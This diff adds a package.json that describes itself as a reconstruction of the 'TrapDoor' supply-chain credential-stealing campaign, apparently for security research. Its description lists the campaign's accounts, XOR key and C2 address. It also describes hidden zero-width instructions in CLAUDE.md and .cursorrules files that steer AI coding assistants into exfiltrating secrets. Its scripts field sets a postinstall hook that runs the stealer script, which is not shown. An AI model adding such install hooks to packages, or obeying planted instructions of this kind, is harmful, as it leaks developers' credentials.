@@ -1,0 +1,9 @@
+{
+  "name": "solidity-deploy-guard",
+  "version": "0.1.0",
+  "description": "RECONSTRUCTION of the TrapDoor campaign (active since 22 mai 2026 — eth-security-auditor@0.1.0 on PyPI 20:20:18 UTC). Cross-ecosystem credential stealer targeting crypto/DeFi/Solana/AI developers. 21 npm packages, 7 PyPI, 6 Crates.io. npm vector: postinstall hook runs trap-core.js (48485 bytes, 1149 lines). The novel TrapDoor innovation is implanting .cursorrules and CLAUDE.md files containing instructions hidden via zero-width Unicode characters — these instruct AI coding assistants (Claude Code, Cursor) to run a 'security scan' that exfiltrates secrets. Campaign marker: P-2024-001. XOR key: cargo-build-helper-2026. GitHub: ddjidd564, npm: asdxzxc. C2: ddjidd564.github.io/defi-security-best-practices/. npm packages now replaced by security-holding placeholders. Reconstructed from Socket.dev + The Hacker News + Phoenix Security + Aikido reports.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node trap-core.js"
+  }
+}
